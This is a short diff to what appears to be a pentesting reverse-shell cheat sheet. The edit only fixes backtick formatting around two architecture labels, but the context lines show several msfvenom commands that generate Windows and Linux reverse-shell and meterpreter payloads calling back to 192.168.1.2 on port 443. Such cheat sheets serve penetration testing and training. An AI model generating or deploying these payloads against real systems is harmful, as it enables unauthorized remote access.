@@ -158,7 +158,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o rev
 
 `Meterpreter (Metasploit Listener multi/handler) [Staged]`
 
-``x86`
+`x86`
 
 ```cmd
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
@@ -221,7 +221,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
 ```
 
-``x64`
+`x64`
 
 ```cmd
 msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
